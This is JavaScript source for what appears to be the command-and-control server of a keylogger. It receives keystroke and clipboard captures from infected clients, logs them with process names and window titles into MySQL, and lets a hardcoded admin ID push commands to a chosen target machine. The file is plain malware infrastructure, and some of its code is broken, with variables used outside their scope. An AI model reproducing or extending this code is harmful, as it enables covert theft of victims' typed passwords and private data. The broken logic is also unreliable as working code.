var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
var keyCodes = require('./keyCodes.json');
// подключенные клиенты
var clients = [];
var targets = [];
var WebSocketServer = require('ws').Server;
var LRCDataReader = require('./lrcdata-reader.js');

//Database config
var mysql      = require('mysql');
var databaseConfigObj  = {
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'lrc',
};
var database = mysql.createConnection(databaseConfigObj);

database.connect(function(err) {
    if(err != null) {
        console.log(err);
        throw err;
    }
});

// WebSocket-сервер на порту 25565
var webSocketServer = new WebSocketServer({ port: 25565 });
console.log ('Server is runing');

webSocketServer.on('connection', connection);

function connection(ws) {
    console.log('[Info]New client conected');

    var lastAnswer = [];
    var isAuthorized = false;
    var isJSONParsed = true;

    //If noAuth close connection
    setTimeout(function() {
        if(!isAuthorized){
            ws.close();
        }
    },60000);

    ws.on('message', function (message, flags) {
        if(flags['binary']){
            parseBinaryMessage(message,ws);
        }
        else {
            parseJSONMessage(message,ws);
        }
    });
    ws.on('close', function close() {
            if(lastAnswer['id'] in clients) {
                 delete  clients[lastAnswer['id']];
                console.log('[Info]Conection closed id ' + lastAnswer['id']);
            }
            else{
                console.log('[Info]Conection closed client unauthorized' );
            }
        }
    );
}

function parseBinaryMessage (data, ws) {
    var lrcdata = LRCDataReader.read(data);
    if (!lrcdata.ok) {
        console.log('[ERROR]Can\'t parse LRCData');
        return;
    }

    if (clients[lrcdata['id']] == null) {
        clients[lrcdata['id']] = ws;
        ws.send('accepted');
        console.log('[Info]Client is authorized ' + lrcdata['id']);
        isAuthorized = true;
    }

    console.log(lrcdata.data.items);
    saveData();


    function saveData() {

        database.query('SELECT id FROM users WHERE ? LIMIT 1', {shaId : lrcdata.id} , function (err, rows, fields) {
            var id;
            if (err != null) {
                console.log('[ERROR]Failed to SELECT id: ' + err);
                return;
            }

            if (rows.length === 0) {
                database.query('INSERT INTO users (shaId) VALUES (?)',[ lrcdata.id ] , function (err, result) {
                    id = result.insertId;
                    console.log('id = defined');
                });
                console.log('[INFO]User inserted');
            }
            else
            {
                id = rows[0]['id'];

            }
            switch (lrcdata.type){
                case 0:
                    console.log('[ERROR]' + lrcdata.data.message);
                    break;
                case 1:
                    prepareKeyboard(id);
                    break;
                case 2:
                    prepareClipboard(id);
                    break;
            }
            function prepareClipboard (id) {
                var items = lrcdata.data.items;
                items.forEach(function(item, i, arr) {
                    var values = [id,item.wndInfo.process,item.wndInfo.title,item.data,item.wndInfo.time];
                    var sql = 'INSERT INTO clipboard (userId,process,title,text,eventTime) VALUES ( ?,?,?,?,FROM_UNIXTIME(?))';
                    insertInToTable(sql,values);
                });
            }
            function prepareKeyboard (id) {
                var items = lrcdata.data.items;
                items.forEach(function(item, i, arr) {
                    var text = parseKeyCodes(item);
                    var values = [id,item.wndInfo.process,item.wndInfo.title,text,item.wndInfo.time];
                    var sql = 'INSERT INTO keyboard (userId,process,title,text,eventTime) VALUES ( ?,?,?,?,FROM_UNIXTIME(?))';
                    insertInToTable(sql,values);
                });
            }
            function parseKeyCodes (item) {
                var keys = item.keys;
                var text = '';
                keys.forEach(function(key, i, arr) {
                    console.log (key);
                    var char = keyCodes[key.keyCode];
                    if(typeof(char) != "undefined")
                    {
                        text += char;
                    }
                    else
                    {
                        text += '*';
                    }
                });
                console.log('TEXT : '+text);
                return text;
            }
            function insertInToTable (sql,values) {
                database.query(sql , values, function (err, rows, fields) {
                    if (err != null) {
                        throw err;
                    }
                    console.log('[INFO] row inserted');
                });
            }
        });
    }
    /*
    items.forEach(function(item, i, arr) {
        console.log(item.keys);
    });*/
}

function parseJSONMessage (data, ws) {
    //Try to parse JSON
    parse_JSON();

    //Check id length
    if(lastAnswer['id'] == null){
        console.log('[ERROR]Id = NULL !');
        ws.close();
        return;
    }
    if (lastAnswer['id'].length != 64) {
        console.log('[ERROR]Incorect id length!');
        ws.close();
        return;
    }

    /*console.log('id = ' + inputArr['id']);
     console.log(clients[inputArr['id']]);
     clients[inputArr['id']] = ws;*/
    if (clients[lastAnswer['id']] == null) {
        clients[lastAnswer['id']] = ws;
        ws.send('accepted');
        console.log('[Info]Client is authorized ' + lastAnswer['id']);
        isAuthorized = true;
    }
    else {
        //Procesing data
        if (lastAnswer['ok']) {
            if(targets[lastAnswer['id']]) {
                if(isJSONParsed) {
                    try {
                        clients[adminID].send(lastAnswer['data']);
                    }
                    catch (e) {
                        console.log('[WARNING]Admin is disconected error + ' + e + '!');
                    }
                }
                else {
                    clients[adminID].send('[ERROR]Client JSON is not parsed !');
                }
            }
            else {
                switch (lastAnswer['type']) {
                    case 'keyboard':
                        console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
                        getData(lastAnswer['id'], 'getkeyboard');
                        break;
                    case 'clipboard':
                        console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
                        getData(lastAnswer['id'], 'getclipboard');
                        break;
                    case 'request':
                        if (lastAnswer['id'] == adminID) {
                            console.log('Request: ' + lastAnswer['data']['request']);
                            targets[lastAnswer['data']['targetId']] = true;
                            try {
                                clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
                            }
                            catch (e) {
                                ws.send('[ERROR]Client is offline now!');
                            }
                        }
                        else {
                            console.log('[ERROR]Incorect adminId!');
                        }
                        break;
                }
            }
        }
        else {
            console.log('[Client ERROR]' + lastAnswer['error']);
        }
    }


    function parse_JSON () {
        var backUpJSON = lastAnswer;
        try {
            lastAnswer = JSON.parse(message);
        }
        catch (e) {
            lastAnswer = backUpJSON;
            console.log('[ERROR]Failed to parse JSON!');
            ws.close();
            isJSONParsed = false;
        }
    }
}